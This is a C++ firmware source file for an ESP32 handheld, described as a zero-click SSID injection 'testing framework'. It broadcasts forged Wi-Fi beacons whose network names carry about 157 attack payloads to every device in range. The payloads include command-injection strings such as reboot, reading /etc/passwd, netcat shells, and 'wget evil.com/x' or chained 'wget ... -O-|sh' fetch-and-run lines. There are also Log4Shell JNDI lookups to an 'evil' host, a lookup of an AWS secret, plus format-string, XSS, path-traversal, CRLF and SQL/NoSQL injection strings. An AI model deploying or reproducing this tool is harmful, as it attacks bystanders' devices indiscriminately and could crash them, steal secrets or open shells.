/*
 * wifi_ciw — CIW Zeroclick SSID injection testing framework.
 *
 * Ported from Evil-M5Project (Evil-Cardputer v1.5.2) into POSEIDON style.
 *
 * Broadcasts beacon frames with SSID payloads targeting driver
 * vulnerabilities: command injection, buffer overflow, format string,
 * Log4Shell JNDI, XSS, CRLF, path traversal, heap spray, etc.
 *
 * 14 payload categories, ~157 payloads. Rotates SSID on a configurable
 * interval. Monitors for fast disconnects as potential crash indicators.
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include <WiFi.h>
#include <esp_wifi.h>

/* ── Payload categories ───────────────────────────────────────────── */
enum CiwCat : uint8_t {
    CIW_CMD=0, CIW_OVERFLOW, CIW_FMT, CIW_PROBE, CIW_ESC, CIW_SERIAL,
    CIW_ENC, CIW_CHAIN, CIW_HEAP, CIW_XSS, CIW_PATH, CIW_CRLF,
    CIW_JNDI, CIW_NOSQL, CIW_CAT_COUNT
};

static const char *const s_cat_names[] = {
    "CMD","OVFL","FMT","PROBE","ESC","SERIAL",
    "ENC","CHAIN","HEAP","XSS","PATH","CRLF",
    "JNDI","NoSQL"
};

struct CiwPayload {
    char     ssid[64];
    uint8_t  cat;
};

/* ── Hardcoded payload table (in flash) ───────────────────────────── */
#define P(s, c) { s, c }
static const CiwPayload PAYLOADS[] PROGMEM = {
    /* wifi_cmd (25) */
    P("|reboot|", CIW_CMD), P("&reboot&", CIW_CMD), P("`reboot`", CIW_CMD),
    P("$reboot$", CIW_CMD), P(";reboot;", CIW_CMD), P("$(reboot)", CIW_CMD),
    P("|shutdown -r|", CIW_CMD), P("&cat /etc/passwd", CIW_CMD),
    P("reboot\\nreboot", CIW_CMD), P("reboot\\r\\nreboot", CIW_CMD),
    P("|../../bin/sh|", CIW_CMD), P("${IFS}reboot", CIW_CMD),
    P("*;reboot", CIW_CMD), P("$(echo reboot|sh)", CIW_CMD),
    P("reboot\\x00ignored", CIW_CMD), P("|nc -lp 4444 -e sh|", CIW_CMD),
    P("&wget evil.com/x&", CIW_CMD), P("$(curl evil.com)", CIW_CMD),
    P("|id>/tmp/pwn|", CIW_CMD), P("\\x00|reboot|", CIW_CMD),
    P("& ping -n 3 127.0.0.1 &", CIW_CMD), P("|powershell -c reboot|", CIW_CMD),
    P("`busybox reboot`", CIW_CMD), P("$(kill -9 1)", CIW_CMD),
    P("|/bin/busybox telnetd|", CIW_CMD),

    /* wifi_overflow (26) */
    P("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", CIW_OVERFLOW),
    P("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", CIW_OVERFLOW),  /* 33-byte off-by-one */
    P("%s%s%s%sAAAAAAAAAAAAAAAAAAAAAAAA", CIW_OVERFLOW),
    P("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n", CIW_OVERFLOW),
    P("", CIW_OVERFLOW),  /* empty SSID */
    P(" ", CIW_OVERFLOW),  /* single space */
    P("A", CIW_OVERFLOW),  /* single byte */
    P("ABCDEFGHIJKLMNOPQRSTUVWXYZ123456", CIW_OVERFLOW), /* 32-byte sequential */

    /* wifi_fmt (15) */
    P("%s%s%s%s%s", CIW_FMT), P("%n%n%n%n", CIW_FMT),
    P("%x%x%x%x", CIW_FMT), P("%p%p%p%p", CIW_FMT),
    P("%d%d%d%d%d%d", CIW_FMT), P("AAAA%08x%08x%08x", CIW_FMT),
    P("%s%s%s%s%s%s%s%s%s%s", CIW_FMT), P("%08x.%08x.%08x.%08x", CIW_FMT),
    P("%n%n%n%n%n%n%n%n", CIW_FMT), P("%hn%hn%hn%hn", CIW_FMT),
    P("%1$s%2$s%3$s", CIW_FMT), P("%1$n%2$n", CIW_FMT),
    P("%.9999d", CIW_FMT),

    /* wifi_probe (14) */
    P("", CIW_PROBE), P(" ", CIW_PROBE),
    P("ValidSSID\\xff", CIW_PROBE), P("Test\\x00Hidden", CIW_PROBE),
    P("DIRECT-xx-SPOOF", CIW_PROBE),

    /* wifi_esc (8) */
    P("\\x1b[2J\\x1b[H", CIW_ESC), P("\\x1b]0;HACKED\\x07", CIW_ESC),
    P("\\x1b[6n", CIW_ESC), P("\\x1b[?47h", CIW_ESC),
    P("\\x1b[31mERROR\\x1b[0m", CIW_ESC), P("\\x1b[1A\\x1b[2K", CIW_ESC),
    P("\\x1b[32mroot@srv\\x1b[0m", CIW_ESC), P("\\x1b[8m", CIW_ESC),

    /* wifi_serial (13) */
    P("\",\"admin\":true,\"x\":\"", CIW_SERIAL),
    P("</name><admin>1</admin>", CIW_SERIAL),
    P("'; DROP TABLE wifi;--", CIW_SERIAL),
    P("{\"role\":\"admin\"}", CIW_SERIAL),
    P("key=val\\nnewsection", CIW_SERIAL),
    P("{{7*7}}", CIW_SERIAL), P("<%= system('id') %>", CIW_SERIAL),
    P("${7*7}", CIW_SERIAL), P("=CMD(\"calc\")", CIW_SERIAL),

    /* wifi_enc (8) */
    P("%7Creboot%7C", CIW_ENC), P("%24(reboot)", CIW_ENC),
    P("&vert;reboot&vert;", CIW_ENC),

    /* wifi_chain (8) */
    P("$(", CIW_CHAIN), P("reboot)", CIW_CHAIN),
    P("|nc 192.168.4.1", CIW_CHAIN), P("4444 -e /bin/sh|", CIW_CHAIN),
    P("%x%x%x%x_LEAK", CIW_CHAIN), P("%n%n_WRITE", CIW_CHAIN),
    P("wget http://192.168", CIW_CHAIN), P(".4.1/x -O-|sh", CIW_CHAIN),

    /* wifi_heap (8) */
    P("\\xde\\xad\\xbe\\xef", CIW_HEAP), P("\\xba\\xad\\xf0\\x0d", CIW_HEAP),

    /* wifi_xss (8) */
    P("<script>alert(1)</script>", CIW_XSS),
    P("<img src=x onerror=alert(1)>", CIW_XSS),
    P("<svg onload=alert(1)>", CIW_XSS),
    P("<body onload=alert(1)>", CIW_XSS),
    P("<details open ontoggle=alert(1)>", CIW_XSS),
    P("<iframe src=javascript:alert(1)>", CIW_XSS),
    P("';alert(1)//", CIW_XSS),
    P("<marquee onstart=alert(1)>", CIW_XSS),

    /* wifi_path (6) */
    P("../../../etc/shadow", CIW_PATH),
    P("..\\\\..\\\\..\\\\etc\\\\shadow", CIW_PATH),
    P("/proc/self/environ", CIW_PATH),
    P("/dev/urandom", CIW_PATH),

    /* wifi_crlf (6) */
    P("\\r\\nX-Injected: true", CIW_CRLF),
    P("\\r\\nLocation: http://evil", CIW_CRLF),
    P("\\r\\n\\r\\n<html>injected", CIW_CRLF),

    /* wifi_jndi (6) */
    P("${jndi:ldap://evil/x}", CIW_JNDI),
    P("${jndi:dns://evil/x}", CIW_JNDI),
    P("${env:AWS_SECRET}", CIW_JNDI),
    P("${sys:java.version}", CIW_JNDI),
    P("${jndi:rmi://evil/x}", CIW_JNDI),
    P("${${lower:j}ndi:ldap://x}", CIW_JNDI),

    /* wifi_nosql (6) */
    P("admin' || '1'=='1", CIW_NOSQL),
    P("{\"$ne\":1}", CIW_NOSQL),
    P("{\"$regex\":\".*\"}", CIW_NOSQL),
    P("{\"$where\":\"sleep(5000)\"}", CIW_NOSQL),
    P("*)(objectClass=*)", CIW_NOSQL),
    P("admin)(!(&(1=0", CIW_NOSQL),
};
#undef P
#define PAYLOAD_COUNT (sizeof(PAYLOADS)/sizeof(PAYLOADS[0]))

/* ── Beacon frame template (raw 802.11) ───────────────────────────── */
static uint8_t s_beacon[128] = {
    0x80, 0x00, 0x00, 0x00,                         /* type: beacon */
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             /* dst: broadcast */
    0,0,0,0,0,0,                                    /* src BSSID */
    0,0,0,0,0,0,                                    /* bssid */
    0x00, 0x00,                                     /* seq */
    0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, /* timestamp */
    0x64, 0x00,                                     /* beacon interval */
    0x31, 0x04,                                     /* capabilities */
    0x00,                                           /* SSID tag */
    0x00,                                           /* SSID length (filled) */
};

static int build_beacon(const char *ssid, uint8_t ch, uint8_t bssid[6])
{
    memcpy(s_beacon + 10, bssid, 6);
    memcpy(s_beacon + 16, bssid, 6);
    size_t ssid_len = strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;
    s_beacon[37] = (uint8_t)ssid_len;
    memcpy(s_beacon + 38, ssid, ssid_len);

    uint8_t *p = s_beacon + 38 + ssid_len;
    /* Supported rates */
    *p++ = 0x01; *p++ = 0x08;
    *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
    *p++ = 0x24; *p++ = 0x30; *p++ = 0x48; *p++ = 0x6C;
    /* DS parameter set */
    *p++ = 0x03; *p++ = 0x01; *p++ = ch;
    return (int)(p - s_beacon);
}

/* ── Category selection submenu ───────────────────────────────────── */
static uint16_t s_cat_mask = 0xFFFF; /* all enabled by default */

static void cat_select_menu(void)
{
    int cursor = 0;
    bool redraw = true;
    while (true) {
        if (redraw) {
            ui_clear_body();
            ui_draw_footer("ENTER=toggle  `=done");
            ui_text(4, BODY_Y+2, T_ACCENT, "PAYLOAD CATEGORIES");
            for (int i = 0; i < CIW_CAT_COUNT && i < 9; i++) {
                bool on = s_cat_mask & (1 << i);
                uint16_t fg = (i == cursor) ? T_ACCENT : (on ? T_FG : T_DIM);
                ui_text(4, BODY_Y + 14 + i*10, fg, "%c %s",
                         on ? '+' : '-', s_cat_names[i]);
            }
            redraw = false;
        }

        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(30); continue; }
        if (k == PK_ESC) return;
        if (k == PK_UP && cursor > 0) { cursor--; redraw = true; }
        if (k == PK_DOWN && cursor < CIW_CAT_COUNT-1) { cursor++; redraw = true; }
        if (k == PK_ENTER) { s_cat_mask ^= (1 << cursor); redraw = true; }
    }
}

/* ================================================================== *
 *  CIW ZEROCLICK MAIN                                                *
 * ================================================================== */
void feat_wifi_ciw(void)
{
    radio_switch(RADIO_WIFI);

    /* Category selection first */
    cat_select_menu();

    /* Build active payload list based on mask */
    static CiwPayload active[PAYLOAD_COUNT];
    int activeN = 0;
    for (size_t i = 0; i < PAYLOAD_COUNT; i++) {
        CiwPayload p;
        memcpy_P(&p, &PAYLOADS[i], sizeof(CiwPayload));
        if (s_cat_mask & (1 << p.cat)) {
            memcpy(&active[activeN++], &p, sizeof(CiwPayload));
        }
    }

    if (activeN == 0) {
        ui_toast("no payloads selected", T_WARN, 1500);
        return;
    }

    /* Start AP mode for raw beacon injection */
    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAP(active[0].ssid, nullptr, 1, false, 10);

    /* Enable promiscuous for raw TX */
    esp_wifi_set_promiscuous(true);

    int idx = 0;
    uint32_t rotateInterval = 5000; /* 5s default */
    uint32_t lastRotate = millis();
    uint32_t alerts = 0;
    bool running = true;

    ui_clear_body();
    ui_draw_footer("+/-=speed  `=stop");
    ui_text(4, BODY_Y+2, T_ACCENT, "CIW ZEROCLICK");
    ui_text(4, BODY_Y+14, T_FG, "payloads: %d", activeN);

    uint32_t tUI = 0;
    while (running) {
        uint16_t k = input_poll();
        if (k == PK_ESC) break;
        if (k == '+' || k == '=') { if (rotateInterval > 1000) rotateInterval -= 1000; }
        if (k == '-' || k == '_') { rotateInterval += 1000; }

        /* Rotate SSID */
        if (millis() - lastRotate >= rotateInterval) {
            idx = (idx + 1) % activeN;
            WiFi.softAP(active[idx].ssid, nullptr, 1, false, 10);
            lastRotate = millis();

            /* Also send raw beacon for maximum coverage */
            uint8_t bssid[6];
            bssid[0] = 0xDE; bssid[1] = 0xAD;
            bssid[2] = random(0,256); bssid[3] = random(0,256);
            bssid[4] = random(0,256); bssid[5] = random(0,256);
            int flen = build_beacon(active[idx].ssid, 1, bssid);
            esp_wifi_80211_tx(WIFI_IF_AP, s_beacon, flen, false);
        }

        /* UI update */
        if (millis() - tUI > 300) {
            tUI = millis();
            ui_text(4, BODY_Y+28, T_FG,    "[%d/%d] %s", idx+1, activeN,
                     s_cat_names[active[idx].cat]);
            /* Truncate SSID for display (240px ~= 38 chars at textSize 1) */
            char disp[34];
            strncpy(disp, active[idx].ssid, 33); disp[33] = '\0';
            ui_text(4, BODY_Y+40, T_ACCENT, "%.33s", disp);
            ui_text(4, BODY_Y+54, T_DIM,    "interval: %lums", (unsigned long)rotateInterval);
            ui_text(4, BODY_Y+66, alerts ? T_BAD : T_DIM,
                                             "alerts: %lu", (unsigned long)alerts);
            ui_draw_status(radio_name(), "ciw");
        }
        delay(10);
    }

    esp_wifi_set_promiscuous(false);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_MODE_APSTA);
}
